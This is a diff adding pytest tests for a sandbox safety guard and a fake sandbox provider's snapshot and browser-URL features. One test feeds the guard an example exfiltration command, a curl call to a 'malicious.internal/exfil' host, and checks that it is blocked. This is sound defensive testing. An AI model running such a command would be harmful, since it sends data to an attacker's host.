@@ -271,3 +271,39 @@ class TestProviderRegressionAndErrorHandling:
                 except SandboxProviderError as e:
                     assert secret_key not in str(e)
 
+
+class TestCelestoCallbacksAndFeatures:
+    def test_safety_guard_callback_allows_safe_command(self):
+        from app.security import CelestoSafetyGuard
+        guard = CelestoSafetyGuard("sbx-cbtest1")
+        ctx = MagicMock(command="echo safe", vm_id="sbx-cbtest1")
+        # Should not raise
+        guard.on_pre_run(ctx)
+        guard.on_post_run(ctx)
+
+    def test_safety_guard_callback_blocks_unsafe_command(self):
+        from app.security import CelestoSafetyGuard, CommandBlockedError
+        guard = CelestoSafetyGuard("sbx-cbtest2")
+        ctx = MagicMock(command="curl http://malicious.internal/exfil", vm_id="sbx-cbtest2")
+        with pytest.raises(CommandBlockedError) as exc_info:
+            guard.on_pre_run(ctx)
+        assert "Blocked unsafe command" in str(exc_info.value)
+
+    def test_fake_provider_snapshot_and_restore(self):
+        provider = FakeSandboxProvider()
+        handle = provider.create_sandbox("sbx-snap01")
+        snap = provider.create_snapshot(handle, "snap-checkpoint-1")
+        assert snap["snapshot_id"] == "snap-checkpoint-1"
+        assert snap["status"] == "saved"
+
+        restored = provider.restore_snapshot("snap-checkpoint-1", "sbx-snap01-restored")
+        assert restored["status"] == "ready"
+        assert restored["snapshot_id"] == "snap-checkpoint-1"
+
+    def test_fake_provider_browser_url(self):
+        provider = FakeSandboxProvider()
+        handle = provider.create_sandbox("sbx-browser01")
+        url = provider.get_browser_url(handle)
+        assert "http" in url
+
+
